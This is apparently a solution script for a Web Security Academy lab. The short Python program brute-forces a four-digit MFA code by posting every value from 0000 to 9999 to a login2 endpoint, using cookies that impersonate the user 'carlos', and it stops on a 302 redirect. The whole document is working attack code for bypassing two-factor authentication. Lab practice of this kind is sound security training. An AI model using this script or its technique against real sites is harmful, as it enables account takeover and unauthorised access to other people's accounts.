import requests

url = "https://0ac0004b047209a2c07e274800da0068.web-security-academy.net/login2"

cookies = {
    "verify" : "carlos",
    "session" : "04K46uJ3h3JZcAkfTwOvslvjOoPfnXP7"
}

counter = 1

for x in range(10000):  
    code = f"{x:0>4}" 
    data = { "mfa-code" : code}
    res = requests.post(url, cookies=cookies, data=data)
    print("Request count",counter, end='\r')
    if res.status_code == 302:
        print("Verification code found", code)
        break
    counter +=1